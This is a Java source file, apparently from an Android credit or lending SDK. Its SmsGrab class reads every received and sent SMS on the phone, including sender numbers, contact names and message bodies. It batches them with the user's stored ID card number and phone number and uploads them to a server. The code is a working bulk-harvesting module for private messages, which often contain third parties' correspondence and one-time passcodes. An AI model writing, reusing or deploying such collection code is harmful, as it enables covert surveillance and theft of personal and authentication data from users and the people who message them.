package com.yxjr.credit.grab;

import java.text.SimpleDateFormat;
import java.util.Date;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.yxjr.credit.constants.HttpConstant;
import com.yxjr.credit.constants.SpConstant;
import com.yxjr.credit.http.manage.NoConfineAsyncTask;
import com.yxjr.credit.log.YxLog;
import com.yxjr.credit.util.YxCommonUtil;
import com.yxjr.credit.util.YxStoreUtil;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;

public class SmsGrab extends Grab {

    private Context mContext;

    public SmsGrab(Context context) {
        this.mContext = context;
    }

    @SuppressLint("SimpleDateFormat")
    @Override
    public JSONArray getData(String time) {
        String selection = null;
        if (YxCommonUtil.isNotBlank(time)) {
            long record = YxCommonUtil.dateStringToLong(time);
            selection = "date >'" + record + "'";//查询条件
        }
        final String SMS_URI_ALL = "content://sms/";// 所有的短信
        //		Uri uri = Sms.Inbox.CONTENT_URI;
        //		final String SMS_URI_INBOX = "content://sms/inbox";// 收件箱短信
        // 		final String SMS_URI_SEND = "content://sms/sent";// 发件箱短信
        // 		final String SMS_URI_DRAFT = "content://sms/draft";// 草稿箱短信
        JSONArray smsarray = new JSONArray();
        Cursor cur = null;
        try {
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
            cur = mContext.getContentResolver().query(Uri.parse(SMS_URI_ALL), projection, selection, null, "date desc");
            if (cur.moveToFirst()) {//查询的数据是否为空
                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");// 短信类型1是接收到的，2是已发出
                do {
                    String name = cur.getString(nameColumn);// 发件人，如果发件人在通讯录中则为具体姓名，陌生人为null
                    String phoneNumber = cur.getString(phoneNumberColumn);// 发件人地址，即手机号
                    String smsbody = cur.getString(smsbodyColumn);// body：短信具体内容
                    int type = cur.getInt(typeColumn);
                    if (type == 1 || type == 2) {
                        if (smsbody == null) {
                            smsbody = "";
                        }
                        JSONObject smsTemp = new JSONObject();
                        if (name != null) {
                            smsTemp.put("smsName", subStringByByte(name, 50));
                        } else {
                            smsTemp.put("smsName", "");
                        }
                        smsTemp.put("smsNumber", subStringByByte(phoneNumber, 20));
                        smsTemp.put("smsDate", correctDate(Long.parseLong(cur.getString(dateColumn))));
                        smsTemp.put("smsContent", subStringByByte(smsbody, 2000));
                        smsTemp.put("smsType", type);
                        smsarray.put(smsTemp);
                    }
                } while (cur.moveToNext());
            }
        } catch (SQLiteException ex) {
            YxLog.e("SQLiteException:" + ex);
            ex.printStackTrace();
        } catch (SecurityException se) {
            // TODO: handle exception
            YxLog.e("SecurityException:without permission android.permission.READ_SMS and android.permission.WRITE_SMS" + se);
        } catch (Exception e) {
            // TODO: handle exception
            YxLog.e("Exception:" + e);
            e.printStackTrace();
        } finally {
            if (null != cur) {
                cur.close();
            }
        }
        return smsarray;
    }

    @Override
    public void upload() {
        new Task().execute();
    }

    private class Task extends NoConfineAsyncTask<String, String, String> {

        @Override
        protected String doInBackground(String... params) {
            try {
                int interval = getInterval(mContext, SpConstant.MSQ);
                String smsTime = getLastTime(mContext, SpConstant.M_LASTTIME);
                boolean surpass = isSurpass(mContext, SpConstant.M_IS);
                if (interval != 0 && surpass) {
                    JSONArray smsArray = getData(smsTime);
                    if (null != smsArray) {
                        final String idCard = YxStoreUtil.get(mContext, SpConstant.PARTNER_ID_CARD_NUM);
                        final String phoneNo = YxStoreUtil.get(mContext, SpConstant.PARTNER_PHONENUMBER);
                        batchJSONArray(smsArray, interval, new OnBatchListener() {

                            @Override
                            public void onBatch(JSONArray array) {
                                try {
                                    JSONObject smsInfo = new JSONObject();
                                    smsInfo.put("cert", idCard);
                                    smsInfo.put("mobileNo", phoneNo);
                                    smsInfo.put("smsInfo", array);
                                    sendServer(mContext, HttpConstant.Request.SEND_SMS, smsInfo);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return "";
        }
    }
}
